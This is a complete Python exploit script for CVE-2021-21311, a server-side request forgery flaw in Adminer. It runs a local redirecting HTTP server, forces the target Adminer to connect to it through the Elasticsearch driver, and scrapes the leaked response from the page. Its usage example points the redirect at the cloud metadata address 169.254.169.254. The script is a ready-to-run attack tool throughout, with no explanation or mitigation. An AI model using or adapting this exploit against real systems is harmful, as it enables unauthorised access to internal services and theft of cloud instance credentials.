#!/usr/bin/python3
# CVE-2021-21311
from requests import Session
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from argparse import ArgumentParser
from bs4 import BeautifulSoup

class Adminer(object):
    def __init__(self, host, debug = False):
        if host[-1] == '/':
            host = host[:-1]
        self.host = host
        self.session = Session()
        if debug:
            self.session.proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1'}
        self.session.verify = False

    def connect(self, driver, server, username, password, database, permanent = 0):
        endpoint = 'index.php'
        params = {
            'auth[driver]': driver,
            'auth[server]': server,
            'auth[username]': username,
            'auth[password]': password,
            'auth[db]': database,
            'auth[permanent]': permanent
        }
        response = self.session.post(f'{self.host}/{endpoint}', data = params, allow_redirects = True)
        return response

class HTTPRequestHandler(BaseHTTPRequestHandler):
    def __init__(self, redirect, *args):
        self.redirect = redirect
        BaseHTTPRequestHandler.__init__(self, *args)

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', self.redirect)
        self.end_headers()

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
    
    def do_PUT(self):
        self.send_response(200)
        self.end_headers()
    
    def do_PATCH(self):
        self.send_response(200)
        self.end_headers()

    def do_DELETE(self):
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        print(f'[CLIENT] {self.client_address[0]}:{self.client_address[1]}')
        print('[REQUEST]')
        print(self.requestline)
        data = None
        for key in self.headers:
            print(f'{key}: {self.headers[key]}')
            if key.lower() == 'content-length':
                data = self.rfile.read(int(self.headers[key])).decode()
        if data:
            print('[DATA]')
            print(data)

class Server(object):
    def __init__(self, host, port, redirect):
        def handler(*args):
            HTTPRequestHandler(redirect, *args)
        httpd = HTTPServer((host, port), handler)
        httpd.serve_forever()

class Parser(object):
    def args(self):
        argsp = ArgumentParser(description = 'CVE-2021-21311 - Exploit', epilog = 'example: python3 %(prog)s --host 10.10.14.21 --url http://adminer.local --redirect http://169.254.169.254/latest/meta-data/instance-id')
        argsp.add_argument('--url', action = 'store', help = 'the vulnerable host', required = True)
        argsp.add_argument('--redirect', action = 'store', help = 'url to redirect', required = True)
        argsp.add_argument('--host', action = 'store', help = 'host interface to listen on & SSRF payload', required = True)
        argsp.add_argument('--port', action = 'store', type = int, default = 80, help = 'port to listen on')
        return argsp.parse_args()
    
    def ssrf(self, html):
        soup = BeautifulSoup(html, 'html.parser')
        return soup.find('div', {'class': 'error'}).text

if __name__ == '__main__':
    args = Parser().args()
    print(f'Running HTTP Server on {args.host}:{args.port}')
    thread = Thread(target = Server, args = (args.host, args.port, args.redirect), daemon = True)
    thread.start()
    print('[CVE-2021-21311]')
    adminer = Adminer(host = args.url, debug = False)
    html = adminer.connect(driver = 'elastic', server = f'{args.host}', username = '', password = '', database = '').text
    response = Parser().ssrf(html)
    print('[SSRF Response]')
    print(response)